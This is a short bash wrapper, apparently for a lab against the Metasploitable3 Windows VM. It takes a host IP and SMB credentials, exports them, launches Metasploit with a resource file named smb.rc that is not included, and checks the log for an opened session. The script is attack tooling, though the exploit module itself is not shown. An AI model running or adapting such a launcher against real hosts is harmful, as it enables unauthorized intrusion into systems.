#!/bin/bash

#SMB Exploit WINDOWS Metasploitable3

#Parameters
#Script ip_address

#Make Sure The Correct Arguments are passed
if [ $# -ne 3 ]
then
	echo "Usage: $0 <host_ip> <smb_user> <smb_pass>"
	exit 1
fi

#Save all the arguments in variables
IP_ADDR=$1
SMBUSER=$2
SMBPASS=$3

#Check for the required utilities
#Check if the metasploit framework is available
if ! command -v msfconsole &> /dev/null; then
    echo "This module requires msfconsole to be installed."
    exit 1
fi


#Export the variables so they can be taken in by Metasploit
export IP_ADDR
export SMBUSER
export SMBPASS


#Run the RC Script
command msfconsole -r smb.rc &> ./log 

#Check if the script contains a successful exploit
if grep -q "opened" log;
then 
	exit 1
else 
	exit 0
fi

